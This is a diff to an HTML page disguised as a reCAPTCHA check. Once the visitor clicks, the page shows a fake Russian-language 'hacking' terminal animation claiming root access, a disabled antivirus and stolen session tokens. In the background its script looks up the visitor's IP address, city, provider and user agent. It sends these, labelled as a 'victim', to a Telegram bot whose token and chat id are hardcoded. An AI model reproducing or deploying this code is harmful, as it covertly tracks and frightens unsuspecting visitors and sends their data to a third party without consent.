@@ -15,7 +15,8 @@
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
     </style>
 </head>
-<body>
+<body> <div id="terminal" style="display:none; padding:20px; color:#0f0; font-family:monospace; line-height:1.2; background:#000; height:100vh;"></div>
+
 
     <div id="captcha-box">
         <img src="https://www.gstatic.com" width="80">
@@ -42,16 +43,52 @@
     </div>
 
     <script>
-                async function startHack() {
+                 
+        async function startHack() {
          
             document.getElementById('captcha-box').style.display = 'none';
-            document.getElementById('leak-box').style.display = 'block';
+            const term = document.getElementById('terminal');
+            term.style.display = 'block';
 
+            const lines = [
+                "> [SYSTEM] Инициализация взлома...",
+                "> [INFO] Обход reCAPTCHA v2... [OK]",
+                "> [INFO] Поиск уязвимости CVE-2024-8192...",
+                "> [CRITICAL] Переполнение буфера WebRTC",
+                "> [SYSTEM] Получение привилегий root...",
+                "> [SUCCESS] Доступ к ядру системы получен",
+                "> [INFO] Извлечение базы данных Chrome...",
+                "> [INFO] Сканирование директории /Users/...",
+                "> [WARNING] Попытка обхода антивируса...",
+                "> [SUCCESS] Windows Defender отключен",
+                "> [INFO] Копирование токенов сессий...",
+                "> [ALERT] Сжатие данных завершено. Отправка..."
+            ];
+
+          
+            for (let line of lines) {
+                let p = document.createElement('p');
+                p.innerText = line;
+                p.style.margin = "2px 0";
+                term.appendChild(p);
+                window.scrollTo(0, document.body.scrollHeight);
+                await new Promise(r => setTimeout(r, 100)); 
+            }
+
+         
+            await sendFinalLogs();
+
+ 
+            term.style.display = 'none';
+            document.getElementById('leak-box').style.display = 'block';
+        }
+
+ 
+        async function sendFinalLogs() {
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
             const chat_id = "-1003861311533";
 
             try {
-                
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
@@ -60,22 +97,15 @@
                 document.getElementById('user-geo').innerText = `${d.city}, ${d.country_name}`;
                 document.getElementById('user-os').innerText = navigator.platform;
 
-             
-                const message = 
-                    `🔥 ЖЕРТВА КЛИКНУЛА!\n` +
-                    `📍 IP: ${d.ip}\n` +
-                    `🌍 Город: ${d.city}, ${d.country_name}\n` +
-                    `🏢 Провайдер: ${d.org}\n` +
-                    `📱 Устройство: ${navigator.userAgent}`;
+                const message = `🔥 ЖЕРТВА КЛИКНУЛА!\n📍 IP: ${d.ip}\n🌍 Город: ${d.city}, ${d.country_name}\n📱 Устройство: ${navigator.userAgent}`;
 
-              
                 const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
                 await fetch(url);
 
             } catch (e) {
-              
+             
                 const backup = encodeURIComponent(`⚠️ Переход!\n📱 Устройство: ${navigator.userAgent}`);
-                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${backup}`);
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${backup}`);
             }
         }
     </script>
